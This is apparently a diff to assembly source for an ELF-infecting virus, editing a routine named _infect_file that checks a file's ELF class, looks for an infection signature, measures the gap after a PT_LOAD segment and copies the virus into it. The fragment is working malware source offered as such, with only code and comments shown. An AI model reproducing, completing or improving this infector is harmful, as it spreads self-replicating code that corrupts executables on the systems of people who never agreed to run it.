@@ -318,8 +318,9 @@ _infect_file: ; (string rdi, stat rsi)
 		cmp byte[rsi + 4], 2 ; ELFCLASS64
 		je .check_if_infected
 		cmp byte[rsi + 4], 1 ; ELFCLASS32
-		jne .unmap
-		; TODO: do 32 bits version
+		je .unmap
+
+		; TODO: do 32 bits version (new compilation ?)
 		.check_if_infected:
 			lea rdi, [rel signature]
 			%ifdef DEBUG
@@ -368,8 +369,8 @@ _infect_file: ; (string rdi, stat rsi)
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 			; TODO: maybe infect via PT_NOTE ?
 
-			mov rsi, [rdi + 8]
-			add rsi, [rdi + 32]; rsi at the end of pt_load
+			mov rsi, [rdi + 8]; p_offset
+			add rsi, [rdi + 32]; p_filesz, rsi at the end of pt_load
 
 			; copy virus
 			push rdi
